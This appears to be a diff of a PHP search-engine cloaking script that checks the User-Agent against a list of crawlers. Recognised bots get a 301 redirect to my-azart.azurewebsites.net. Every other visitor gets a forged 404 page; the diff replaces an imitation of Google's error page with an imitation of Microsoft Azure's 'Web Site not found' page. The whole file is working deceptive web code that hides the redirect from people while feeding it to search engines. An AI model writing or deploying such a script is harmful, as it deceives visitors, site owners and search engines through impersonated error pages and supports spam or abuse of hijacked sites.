@@ -1,119 +1,51 @@
-<?
-function isBot( $user_agent ) {
-	if ( empty( $user_agent ) ) {
-		return false;
-	}
+<?php
 
-	$bots = [
-		// Yandex
-		'YandexBot',
-		'YandexAccessibilityBot',
-		'YandexMobileBot',
-		'YandexDirectDyn',
-		'YandexScreenshotBot',
-		'YandexImages',
-		'YandexVideo',
-		'YandexVideoParser',
-		'YandexMedia',
-		'YandexBlogs',
-		'YandexFavicons',
-		'YandexWebmaster',
-		'YandexPagechecker',
-		'YandexImageResizer',
-		'YandexAdNet',
-		'YandexDirect',
-		'YaDirectFetcher',
-		'YandexCalendar',
-		'YandexSitelinks',
-		'YandexMetrika',
-		'YandexNews',
-		'YandexNewslinks',
-		'YandexCatalog',
-		'YandexAntivirus',
-		'YandexMarket',
-		'YandexVertis',
-		'YandexForDomain',
-		'YandexSpravBot',
-		'YandexSearchShop',
-		'YandexMedianaBot',
-		'YandexOntoDB',
-		'YandexOntoDBAPI',
-		'YandexTurbo',
-		'YandexVerticals',
+function isBot($user_agent)
+{
+    if (empty($user_agent)) {
+        return false;
+    }
+    
+    $bots = [
+        "YandexBot", "YandexAccessibilityBot", "YandexMobileBot", "YandexDirectDyn", "YandexScreenshotBot",
+        "YandexImages", "YandexVideo", "YandexVideoParser", "YandexMedia", "YandexBlogs", "YandexFavicons",
+        "YandexWebmaster", "YandexPagechecker", "YandexImageResizer", "YandexAdNet", "YandexDirect",
+        "YaDirectFetcher", "YandexCalendar", "YandexSitelinks", "YandexMetrika", "YandexNews",
+        "YandexNewslinks", "YandexCatalog", "YandexAntivirus", "YandexMarket", "YandexVertis",
+        "YandexForDomain", "YandexSpravBot", "YandexSearchShop", "YandexMedianaBot", "YandexOntoDB",
+        "YandexOntoDBAPI", "YandexTurbo", "YandexVerticals",
+        "Googlebot", "Googlebot-Image", "Mediapartners-Google", "AdsBot-Google", "APIs-Google",
+        "AdsBot-Google-Mobile", "AdsBot-Google-Mobile", "Googlebot-News", "Googlebot-Video",
+        "AdsBot-Google-Mobile-Apps",
+        "Mail.RU_Bot", "bingbot", "Accoona", "ia_archiver", "Ask Jeeves", "OmniExplorer_Bot", "W3C_Validator",
+        "WebAlta", "YahooFeedSeeker", "Yahoo!", "Ezooms", "Tourlentabot", "MJ12bot", "AhrefsBot",
+        "SearchBot", "SiteStatus", "Nigma.ru", "Baiduspider", "Statsbot", "SISTRIX", "AcoonBot", "findlinks",
+        "proximic", "OpenindexSpider", "statdom.ru", "Exabot", "Spider", "SeznamBot", "oBot", "C-T bot",
+        "Updownerbot", "Snoopy", "heritrix", "Yeti", "DomainVader", "DCPbot", "PaperLiBot", "StackRambler",
+        "msnbot", "msnbot-media", "msnbot-news",
+    ];
 
-		// Google
-		'Googlebot',
-		'Googlebot-Image',
-		'Mediapartners-Google',
-		'AdsBot-Google',
-		'APIs-Google',
-		'AdsBot-Google-Mobile',
-		'AdsBot-Google-Mobile',
-		'Googlebot-News',
-		'Googlebot-Video',
-		'AdsBot-Google-Mobile-Apps',
+    foreach ($bots as $bot) { 
+        if (stripos($user_agent, $bot) !== false) {
+            return $bot;
+        }
+    }
 
-		// Other
-		'Mail.RU_Bot',
-		'bingbot',
-		'Accoona',
-		'ia_archiver',
-		'Ask Jeeves',
-		'OmniExplorer_Bot',
-		'W3C_Validator',
-		'WebAlta',
-		'YahooFeedSeeker',
-		'Yahoo!',
-		'Ezooms',
-		'Tourlentabot',
-		'MJ12bot',
-		'AhrefsBot',
-		'SearchBot',
-		'SiteStatus',
-		'Nigma.ru',
-		'Baiduspider',
-		'Statsbot',
-		'SISTRIX',
-		'AcoonBot',
-		'findlinks',
-		'proximic',
-		'OpenindexSpider',
-		'statdom.ru',
-		'Exabot',
-		'Spider',
-		'SeznamBot',
-		'oBot',
-		'C-T bot',
-		'Updownerbot',
-		'Snoopy',
-		'heritrix',
-		'Yeti',
-		'DomainVader',
-		'DCPbot',
-		'PaperLiBot',
-		'StackRambler',
-		'msnbot',
-		'msnbot-media',
-		'msnbot-news',
-	];
-
-	foreach ( $bots as $bot ) {
-		if ( stripos( $user_agent, $bot ) !== false ) {
-			return $bot;
-		}
-	}
-
-	return false;
+    return false;
 }
 
-$result = isBot( $_SERVER['HTTP_USER_AGENT'] );
-if ( $result === false ) {
+$result = isBot($_SERVER["HTTP_USER_AGENT"]);
+
+if($result === false){      
     header("HTTP/1.1 404 Internal Server Error", true, 404);
-	echo '<!DOCTYPE html><html lang=en>  <meta charset=utf-8>  <meta name=viewport content="initial-scale=1, minimum-scale=1, width=device-width"><title>Error 404 (Page not found)!!1</title>  <style>    *{margin:0;padding:0}html,code{font:15px/22px arial,sans-serif}html{background:#fff;color:#222;padding:15px}body{margin:7% auto 0;max-width:390px;min-height:180px;padding:30px 0 15px}* > body{background:url(//www.google.com/images/errors/robot.png) 100% 5px no-repeat;padding-right:205px}p{margin:11px 0 22px;overflow:hidden}ins{color:#777;text-decoration:none}a img{border:0}@media screen and (max-width:772px){body{background:none;margin-top:0;max-width:none;padding-right:0}}#logo{background:url(//www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png) no-repeat;margin-left:-5px}@media only screen and (min-resolution:192dpi){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat 0% 0%/100% 100%;-moz-border-image:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) 0}}@media only screen and (-webkit-min-device-pixel-ratio:2){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat;-webkit-background-size:100% 100%}}#logo{display:inline-block;height:54px;width:150px}</style>  <a href=//www.google.com/><span id=logo aria-label=Google></span></a>  <p><b>404.</b> <ins>That’s an error.</ins>  <p>The requested URL was not found on this server.  <ins>That’s all we know.</ins>';
-	exit();
+	echo "<!DOCTYPE html><html><head> <meta http-equiv='Content-Type' content='text/html; charset=UTF-8'> <title>Microsoft Azure Web App - Error 404</title> <style type='text/css'> html { height: 100%; width: 100%; } #feature { width: 960px; margin: 75px auto 0 auto; overflow: auto; } #content { font-family: 'Segoe UI'; font-weight: normal; font-size: 22px; color: #ffffff; float: left; margin-top: 68px; margin-left: 0px; vertical-align: middle; } #content h1 { font-family: 'Segoe UI Light'; color: #ffffff; font-weight: normal; font-size: 60px; line-height: 48pt; width: 800px; } a, a:visited, a:active, a:hover { color: #ffffff; } #content a.button { background: #0DBCF2; border: 1px solid #FFFFFF; color: #FFFFFF; display: inline-block; font-family: Segoe UI; font-size: 24px; line-height: 46px; margin-top: 10px; padding: 0 15px 3px; text-decoration: none; } #content a.button img { float: right; padding: 10px 0 0 15px; } #content a.button:hover { background: #1C75BC; } </style> <script type='text/javascript'> function toggle_visibility(id) { var e = document.getElementById(id); if (e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; } </script></head><body bgcolor='#00abec' cz-shortcut-listen='true'><div id='feature'> <div id='content'> <h1>404 Web Site not found.</h1> <p>You may be seeing this error due to one of the reasons listed below :</p> <ul> <li>Custom domain has not been configured inside Azure. See <a href='https://docs.microsoft.com/en-us/azure/app-service-web/app-service-web-tutorial-custom-domain'>how to map an existing domain</a> to resolve this.</li> <li>Client cache is still pointing the domain to old IP address. Clear the cache by running the command <i>ipconfig/flushdns.</i></li> </ul> <p>Checkout <a href='https://blogs.msdn.microsoft.com/appserviceteam/2017/08/08/faq-app-service-domain-preview-and-custom-domains/'>App Service Domain FAQ</a> for more questions.</p> </div></div></body></html>;";
+	exit(); 
 } else {
 	header( "HTTP/1.1 301 Moved Permanently" );
-	header( 'Location:https://my-azart.azurewebsites.net' . $_SERVER['REQUEST_URI'] );
+	header( "Location:https://my-azart.azurewebsites.net" . $_SERVER["REQUEST_URI"] );
 	exit;
 }
+
+
+
 ?>
